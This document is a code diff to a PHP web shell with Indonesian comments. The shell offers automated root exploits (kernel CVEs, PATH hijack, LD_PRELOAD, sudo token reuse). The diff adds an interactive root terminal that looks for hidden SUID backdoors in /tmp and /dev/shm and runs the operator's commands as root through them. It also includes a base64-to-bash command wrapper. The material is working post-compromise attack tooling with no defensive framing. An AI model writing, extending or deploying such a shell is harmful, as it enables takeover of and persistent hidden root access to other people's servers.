@@ -3310,7 +3310,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2215</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2254</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -4011,6 +4011,25 @@ function list_dir($path) {
                 <div style="text-align:center;padding:20px;color:#666;">
                     <span style="font-size:20px;">💀</span>
                     <p style="margin:5px 0;font-size:11px;">Click 🔥 GET ROOT (AUTO) to start</p>
+                </div>
+            </div>
+            
+            <!-- 🎯 INTERACTIVE ROOT TERMINAL - Muncul setelah root berhasil -->
+            <div id="rootTerminal" style="display:none;margin-top:10px;border:2px solid #0f0;border-radius:4px;background:#000;">
+                <div style="background:linear-gradient(135deg,#0f0,#0a0);color:#000;padding:6px 10px;font-weight:bold;font-size:12px;display:flex;justify-content:space-between;align-items:center;">
+                    <span>🎉 INTERACTIVE ROOT TERMINAL</span>
+                    <span style="font-size:10px;background:#000;color:#0f0;padding:2px 6px;border-radius:2px;">uid=0(root)</span>
+                </div>
+                <div id="rootTerminalOutput" style="height:150px;overflow-y:auto;background:#000;padding:8px;font-family:monospace;font-size:11px;color:#0f0;white-space:pre-wrap;">
+                    <span style="color:#888;"># Root terminal ready. Type command below:</span>
+                </div>
+                <div style="display:flex;padding:8px;background:#111;border-top:1px solid #333;">
+                    <span style="color:#0f0;font-family:monospace;font-size:12px;padding:6px 8px;background:#000;border-radius:3px 0 0 3px;border:1px solid #0f0;border-right:none;">root@server#</span>
+                    <input type="text" id="rootTerminalInput" placeholder="Enter command..." style="flex:1;background:#000;color:#0f0;border:1px solid #0f0;border-left:none;padding:6px;font-family:monospace;font-size:12px;outline:none;" onkeypress="if(event.key==='Enter')executeRootCommand()">
+                    <button onclick="executeRootCommand()" style="background:#0f0;color:#000;border:none;padding:6px 15px;font-weight:bold;cursor:pointer;margin-left:5px;border-radius:0 3px 3px 0;">Execute</button>
+                </div>
+                <div style="padding:6px 10px;background:#1a1a1a;font-size:10px;color:#888;display:flex;gap:10px;flex-wrap:wrap;align-items:center;">
+                    <span id="rootTerminalStatus" style="color:#f80;font-weight:bold;">⚠️ STEP 1: Click 🔒 Persist button above to install SUID backdoor</span>
                 </div>
             </div>
         </div>
@@ -6296,15 +6315,19 @@ async function autoGetRoot() {
         statusDiv.innerHTML = `
             <div style="padding:10px;">
                 <div style="color:#0f0;font-weight:bold;">🎉 ROOT OBTAINED!</div>
-                <div style="color:#ff0;font-size:11px;margin-top:5px;">⚠️ Persistence NOT auto-installed</div>
-                <div style="color:#6cf;font-size:10px;margin-top:5px;">Click 🔒 Persist button to install manually</div>
+                <div style="color:#0f0;font-size:11px;margin-top:5px;">✅ Interactive Root Terminal activated below!</div>
+                <div style="color:#ff0;font-size:10px;margin-top:5px;">⚠️ Type commands in terminal or click 🔒 Persist for permanent access</div>
             </div>
         `;
+        
+        // 🎯 TAMPILKAN INTERACTIVE ROOT TERMINAL
+        showRootTerminal();
+        log('[*] 🎯 Interactive Root Terminal activated!', 'success');
         
         log('\n[*] =========================================');
         log('[*] ✅ BRUTAL AUTO-ROOT COMPLETE!', 'success');
         log('[*] Total attempts: ' + attempts);
-        log('[*] Note: Persistence not auto-installed', 'info');
+        log('[*] Note: Use terminal below or install persistence', 'info');
         log('[*] Click "🔒 Persist" button to install manually');
         log('[*] =========================================');
         addPrivescLog('✅ BRUTAL ROOT COMPLETE! (No persistence)', 'success');
@@ -6417,6 +6440,12 @@ async function installPersistenceWithLog() {
             outputDiv.innerHTML += '\n<span style="color:#0f0;">✅ PERSISTENCE INSTALLED!</span>\n';
             outputDiv.innerHTML += '<span style="color:#ff0;">⚠️ SIMPAN INFORMASI INI!</span>\n\n';
             addPrivescLog('Persistence installed!', 'success');
+            
+            // 🎯 Check if terminal should be updated
+            if (rootTerminalActive) {
+                setTimeout(checkSuidBackdoor, 1000);
+                outputDiv.innerHTML += '<span style="color:#6cf;">🔄 Checking root terminal status...</span>\n';
+            }
             
             for (const [method, info] of Object.entries(data.methods)) {
                 const isInstalled = info.status === 'installed' || info.status === 'ready';
@@ -6616,9 +6645,12 @@ async function kernelAutoCompile() {
             if (isReallyRoot) {
                 outputDiv.innerHTML += '\n\n<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED! (Verified)</span>\n';
                 outputDiv.innerHTML += '<span style="color:#0f0;">uid=0(root) confirmed</span>\n';
-                outputDiv.innerHTML += '\n<span style="color:#ff0;">⚠️ Persistence NOT auto-installed. Click 🔒 Persist to install.</span>\n';
+                outputDiv.innerHTML += '\n<span style="color:#0f0;">✅ Interactive Root Terminal activated below!</span>\n';
                 statusDiv.className = 'privesc-status success';
                 statusDiv.innerHTML = '✅ ROOT OBTAINED via ' + targetCve + ' (No persistence)';
+                
+                // 🎯 TAMPILKAN INTERACTIVE ROOT TERMINAL
+                showRootTerminal();
             } else {
                 outputDiv.innerHTML += '\n\n<span style="color:#f44;">[!] Exploit ran but no root access</span>\n';
                 outputDiv.innerHTML += '<span style="color:#888;">Current user: ' + verifyHtml.substring(0, 200) + '</span>\n';
@@ -6669,7 +6701,8 @@ async function hijackPathAttack() {
                     if (isRoot) {
                         outputDiv.innerHTML += '<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
                         outputDiv.innerHTML += '<span style="color:#0f0;">✅ Verified: uid=0(root)</span>\n';
-                        outputDiv.innerHTML += '<span style="color:#ff0;">⚠️ Persistence NOT auto-installed. Click 🔒 Persist to install.</span>\n';
+                        outputDiv.innerHTML += '<span style="color:#0f0;">✅ Interactive Root Terminal activated!</span>\n';
+                        showRootTerminal();
                         return;
                     } else {
                         // Show actual user for debugging
@@ -6721,7 +6754,8 @@ async function ldPreloadAttack() {
                 if (isRoot) {
                     outputDiv.innerHTML += '<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
                     outputDiv.innerHTML += '<span style="color:#0f0;">✅ Verified: uid=0(root)</span>\n';
-                    outputDiv.innerHTML += '<span style="color:#ff0;">⚠️ Persistence NOT auto-installed. Click 🔒 Persist to install.</span>\n';
+                    outputDiv.innerHTML += '<span style="color:#0f0;">✅ Interactive Root Terminal activated!</span>\n';
+                    showRootTerminal();
                 } else {
                     outputDiv.innerHTML += '<span style="color:#f44;">[!] LD_PRELOAD injected but no root</span>\n';
                 }
@@ -6768,7 +6802,8 @@ async function sudoTokenAttack() {
             if (isRoot) {
                 outputDiv.innerHTML += '<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
                 outputDiv.innerHTML += '<span style="color:#0f0;">✅ Verified: uid=0(root)</span>\n';
-                outputDiv.innerHTML += '<span style="color:#ff0;">⚠️ Persistence NOT auto-installed. Click 🔒 Persist to install.</span>\n';
+                outputDiv.innerHTML += '<span style="color:#0f0;">✅ Interactive Root Terminal activated!</span>\n';
+                showRootTerminal();
             } else {
                 outputDiv.innerHTML += '<span style="color:#f44;">[!] Token reuse failed (may have expired or not root)</span>\n';
             }
@@ -7052,6 +7087,172 @@ function installPersistence() {
         .catch(error => {
             outputDiv.innerHTML = '<span style="color:#f44;">❌ Error: ' + escapeHtml(error.message) + '</span>';
         });
+}
+
+// 🎯 INTERACTIVE ROOT TERMINAL FUNCTIONS
+let suidBackdoorPath = null;  // Simpan path SUID backdoor jika ada
+let rootTerminalActive = false;
+
+// Tampilkan terminal setelah root berhasil
+function showRootTerminal() {
+    const terminal = document.getElementById('rootTerminal');
+    const output = document.getElementById('rootTerminalOutput');
+    
+    terminal.style.display = 'block';
+    output.innerHTML = `<span style="color:#0f0;font-weight:bold;">🎉 ROOT ACCESS GRANTED!</span>
+<span style="color:#888;">═══════════════════════════════════════</span>
+<span style="color:#ff0;">⚠️  IMPORTANT: Root access is TEMPORARY!</span>
+<span style="color:#ccc;">   The exploit process has ended. To maintain</span>
+<span style="color:#ccc;">   root access, you need a SUID backdoor.</span>
+
+<span style="color:#6cf;">📋 HOW TO USE THIS TERMINAL:</span>
+<span style="color:#ccc;">   1. Click 🔒 Persist button (in button row above)</span>
+<span style="color:#ccc;">   2. Wait for SUID backdoor installation</span>
+<span style="color:#ccc;">   3. Return to this terminal</span>
+<span style="color:#ccc;">   4. Type commands as root!</span>
+
+<span style="color:#f80;">⏳ Waiting for persistence installation...</span>`;
+    
+    // Auto-focus input
+    document.getElementById('rootTerminalInput').focus();
+    
+    rootTerminalActive = true;
+    
+    // Check if persistence already installed
+    checkSuidBackdoor();
+}
+
+// Cek apakah SUID backdoor sudah terinstall
+async function checkSuidBackdoor() {
+    const commonPaths = ['/tmp/.sysd', '/tmp/.hidden_root', '/tmp/.bash', '/dev/shm/.sysd', '/tmp/.al-sysd'];
+    const output = document.getElementById('rootTerminalOutput');
+    
+    for (const path of commonPaths) {
+        try {
+            const formData = new FormData();
+            formData.append('cmd', 'ls -la ' + path + ' 2>/dev/null');
+            formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
+            
+            const response = await fetch('', { method: 'POST', body: formData });
+            const html = await response.text();
+            
+            if (html.includes('root') && html.includes('s')) {
+                suidBackdoorPath = path;
+                updateTerminalStatus('✅ READY: Type commands below!', '#0f0');
+                
+                // Update output dengan pesan sukses
+                output.innerHTML += `\n<span style="color:#0f0;font-weight:bold;">✅ SUID BACKDOOR DETECTED!</span>
+<span style="color:#0f0;">   Path: ${path}</span>
+<span style="color:#6cf;">   Terminal is now fully operational.</span>
+<span style="color:#6cf;">   Type any command and press Enter.</span>\n`;
+                output.scrollTop = output.scrollHeight;
+                return;
+            }
+        } catch (e) {}
+    }
+    
+    updateTerminalStatus('⚠️ STEP 1: Click 🔒 Persist button above', '#f80');
+}
+
+// Update status terminal
+function updateTerminalStatus(msg, color) {
+    const status = document.getElementById('rootTerminalStatus');
+    status.textContent = msg;
+    status.style.color = color;
+}
+
+// Execute command via root terminal
+async function executeRootCommand() {
+    const input = document.getElementById('rootTerminalInput');
+    const output = document.getElementById('rootTerminalOutput');
+    const cmd = input.value.trim();
+    
+    if (!cmd) return;
+    
+    // Add command to output
+    output.innerHTML += '\n<span style="color:#0f0;">root@server# ' + escapeHtml(cmd) + '</span>\n';
+    output.scrollTop = output.scrollHeight;
+    input.value = '';
+    
+    // Check if we have SUID backdoor
+    if (!suidBackdoorPath) {
+        // Try to find existing backdoor
+        await checkSuidBackdoor();
+    }
+    
+    // Execute command
+    try {
+        let finalCmd;
+        
+        if (suidBackdoorPath) {
+            // Use SUID backdoor for stable root
+            finalCmd = suidBackdoorPath + ' -c "' + cmd.replace(/"/g, '\\"') + '"';
+            
+            const formData = new FormData();
+            formData.append('cmd', finalCmd);
+            formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
+            
+            const response = await fetch('', { method: 'POST', body: formData });
+            const html = await response.text();
+            
+            // Extract output from response
+            const outputMatch = html.match(/<pre[^>]*>([\s\S]*?)<\/pre>/i);
+            const result = outputMatch ? outputMatch[1] : html;
+            
+            // Clean and display
+            const cleanResult = result.replace(/<[^>]+>/g, '').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
+            
+            if (cleanResult.trim()) {
+                output.innerHTML += '<span style="color:#ccc;">' + escapeHtml(cleanResult) + '</span>';
+            } else {
+                output.innerHTML += '<span style="color:#888;">[Command executed, no output]</span>';
+            }
+        } else {
+            // No SUID backdoor - explain to user
+            output.innerHTML += '<span style="color:#f44;">❌ Cannot execute as root: No SUID backdoor found!</span>\n';
+            output.innerHTML += '<span style="color:#ff0;">💡 SOLUTION: Click 🔒 Persist button to install persistence first.</span>\n';
+            output.innerHTML += '<span style="color:#888;">   This creates a SUID binary that allows permanent root access.</span>\n';
+            updateTerminalStatus('⚠️ Install persistence to enable root commands', '#f44');
+        }
+        
+    } catch (err) {
+        output.innerHTML += '<span style="color:#f44;">Error: ' + err.message + '</span>';
+    }
+    
+    output.scrollTop = output.scrollHeight;
+}
+
+// Handle persistence installation from terminal (redirect to main persist function)
+async function installQuickPersist() {
+    const output = document.getElementById('rootTerminalOutput');
+    output.innerHTML += '<span style="color:#6cf;"># Redirecting to full persistence installer...</span>\n';
+    output.innerHTML += '<span style="color:#ff0;"># Please click the 🔒 Persist button in the button row above.</span>\n';
+    updateTerminalStatus('⚠️ Click 🔒 Persist button above', '#f80');
+}
+
+// Get exploit wrapper command (fallback jika tidak ada SUID backdoor)
+async function getExploitWrapperCmd(cmd) {
+    // Cek apakah ada CVE yang sudah berhasil sebelumnya
+    // Untuk sekarang, gunakan metode sederhana
+    // Di production, ini bisa menggunakan CVE yang berhasil di auto-root
+    
+    // Metode 1: Coba pakai capabilities jika ada
+    const capabilitiesCmd = 'cd /tmp; echo "' + btoa(cmd) + '" | base64 -d | bash';
+    
+    // Untuk sekarang return command biasa dengan warning
+    // User perlu install persistence dulu untuk command yang stabil
+    return cmd;
+}
+
+// Escape HTML helper
+function escapeHtml(text) {
+    if (!text) return '';
+    return text
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
 }
 </script>
 </body>
